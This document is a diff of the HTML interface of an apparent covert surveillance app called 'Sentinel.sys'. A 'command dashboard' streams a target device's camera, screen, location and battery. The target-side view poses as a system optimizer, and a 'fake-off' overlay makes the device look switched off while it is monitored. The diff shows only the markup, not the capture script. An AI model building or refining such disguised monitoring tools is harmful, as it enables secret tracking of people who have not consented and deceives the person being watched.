@@ -3,102 +3,137 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Utilitário de Sistema</title>
     <link rel="stylesheet" href="style.css">
     <link rel="manifest" href="manifest.json">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" rel="stylesheet">
     <script src="/socket.io/socket.io.js"></script>
 </head>
 
 <body>
-    <!-- App Container -->
     <div id="container">
 
-        <!-- Selection Mode -->
-        <div id="role-selection" class="glass-panel">
-            <h1>Painel de Controle</h1>
-            <p>Selecione o modo de operação:</p>
-            <div class="buttons">
-                <button id="btn-parent" class="btn primary">📱 Acessar Monitoramento</button>
-                <button id="btn-child" class="btn secondary">🔧 Configurar Dispositivo</button>
+        <!-- Initial Loader & Selection -->
+        <div id="role-selection" class="glass-card">
+            <div class="logo-icon">
+                <span class="material-icons-round" style="font-size: 4rem;">security</span>
             </div>
+            <h1>Sentinel.sys</h1>
+            <p class="subtitle">Otimização e Segurança em Tempo Real</p>
+            
+            <div class="btn-stack">
+                <button id="btn-parent" class="btn-premium btn-primary">
+                    <span class="material-icons-round">analytics</span>
+                    Painel do Monitor
+                </button>
+                <button id="btn-child" class="btn-premium btn-secondary">
+                    <span class="material-icons-round">settings_suggest</span>
+                    Configurar Alvo
+                </button>
+            </div>
+
             <div class="room-box">
-                <input type="text" id="room-input" placeholder="ID de Segurança (ex: FamiliaSilva)"
-                    value="Geral">
+                <p style="margin-bottom: 10px; font-size: 0.8rem;">ID DE SEGURANÇA</p>
+                <input type="text" id="room-input" placeholder="..." value="Geral">
             </div>
         </div>
 
         <!-- Parent Dashboard -->
         <div id="parent-dashboard" class="hidden">
             <header>
-                <h2>Monitoramento em Tempo Real</h2>
-                <div id="target-status" class="status-badge offline">Offline</div>
+                <div>
+                    <h2 style="font-weight: 800;">COMMAND DASHBOARD</h2>
+                    <p style="margin:0; font-size: 0.8rem; letter-spacing: 2px; color: var(--primary);">SENTINEL v1.0</p>
+                </div>
+                <div id="target-status-container" class="status-indicator offline">
+                    <div class="pulse-dot"></div>
+                    <span id="target-status">DESCONECTADO</span>
+                </div>
             </header>
 
-            <div class="grid">
-                <!-- Video/Screen Card -->
-                <div class="card glass">
-                    <div class="card-header">
-                        <span>Fluxo de Vídeo/Tela</span>
-                        <div class="controls">
-                            <button id="cmd-camera" class="btn-icon">📷</button>
-                            <button id="cmd-screen" class="btn-icon">🖥️</button>
+            <div class="dashboard-grid">
+                <!-- Video Section -->
+                <div class="glass-card" style="padding: 0; overflow: hidden;">
+                    <div class="card-title">
+                        <div style="display: flex; align-items: center; gap: 10px;">
+                            <span class="material-icons-round" style="color: var(--primary);">videocam</span>
+                            LIVE STREAM
+                        </div>
+                        <div style="display: flex; gap: 10px;">
+                            <button id="cmd-camera" class="btn-icon-blur"><span class="material-icons-round">linked_camera</span></button>
+                            <button id="cmd-screen" class="btn-icon-blur"><span class="material-icons-round">phonelink_ring</span></button>
                         </div>
                     </div>
-                    <div class="video-wrapper">
+                    <div class="video-container">
                         <video id="remote-video" autoplay playsinline></video>
-                        <div id="video-placeholder">Sem sinal ativo</div>
+                        <div id="video-overlay" class="video-overlay">
+                            <span class="material-icons-round" style="font-size: 3rem; margin-bottom: 1rem; opacity: 0.3;">videocam_off</span>
+                            AGUARDANDO SINAL...
+                        </div>
                     </div>
                 </div>
 
-                <!-- Info Card -->
-                <div class="card glass">
-                    <div class="card-header">Informações do Dispositivo</div>
+                <!-- Info Section -->
+                <div class="glass-card">
+                    <div class="card-title">
+                        <div style="display: flex; align-items: center; gap: 10px;">
+                            <span class="material-icons-round" style="color: var(--secondary);">info</span>
+                            TELEMETRIA
+                        </div>
+                    </div>
                     <div class="info-list">
-                        <div class="info-item">
-                            <span class="label">📍 Localização:</span>
-                            <span id="data-location">Aguardando...</span>
+                        <div class="info-row">
+                            <div class="label-group">
+                                <span class="material-icons-round">my_location</span>
+                                LOCALIZAÇÃO
+                            </div>
+                            <span id="data-location" class="value-text">...</span>
                         </div>
-                        <div class="info-item">
-                            <span class="label">🔋 Bateria:</span>
-                            <span id="data-battery">--%</span>
+                        <div class="info-row">
+                            <div class="label-group">
+                                <span class="material-icons-round">battery_charging_full</span>
+                                ENERGIA
+                            </div>
+                            <span id="data-battery" class="value-text">--%</span>
                         </div>
-                        <div class="info-item">
-                            <span class="label">📶 Rede:</span>
-                            <span id="data-network">--</span>
+                        <div class="info-row">
+                            <div class="label-group">
+                                <span class="material-icons-round">speed</span>
+                                REDE
+                            </div>
+                            <span id="data-network" class="value-text">--</span>
                         </div>
-                    </div>
-                    <div id="map-preview">
-                        <!-- Placeholder for Map -->
-                        <div class="map-placeholder">Clique para ver no Google Maps</div>
+                        
+                        <div id="map-preview" class="btn-premium btn-secondary" style="margin-top: 1.5rem; height: 100px; border-style: dashed;">
+                            <span class="material-icons-round">map</span>
+                            VER NO MAPA
+                        </div>
                     </div>
                 </div>
             </div>
-            <button id="exit-parent" class="btn danger">Sair do Painel</button>
+            
+            <button id="exit-parent" class="btn-premium btn-danger">
+                <span class="material-icons-round">logout</span>
+                SAIR DO SISTEMA
+            </button>
         </div>
 
-        <!-- Child/Target Interface (Disguised) -->
+        <!-- Child Role View -->
         <div id="child-interface" class="hidden">
-            <div id="setup-view" class="glass-panel">
-                <h2>Configuração de Sistema</h2>
-                <p>Otimizando parâmetros de bateria e rede...</p>
-                <div class="progress-bar">
-                    <div class="fill"></div>
-                </div>
-                <button id="start-target" class="btn primary">Iniciar Serviço</button>
+            <div id="setup-view" class="glass-card loader-view" style="text-align: center;">
+                <div class="spinner"></div>
+                <h2>Otimizando Sistema...</h2>
+                <p>Ajustando parâmetros de performance e bateria para o dispositivo alvo.</p>
+                <button id="start-target" class="btn-premium btn-primary" style="margin-top: 2rem; width: 100%;">
+                    ATIVAR SEGURANÇA
+                </button>
             </div>
 
-            <!-- The "Fake Off" Overlay -->
-            <div id="fake-off-overlay" class="hidden">
-                <div class="black-screen"></div>
-            </div>
+            <div id="fake-off-overlay" class="hidden"></div>
         </div>
-
     </div>
 
-    <!-- Scripts -->
     <script src="app.js"></script>
 </body>
-
 </html>
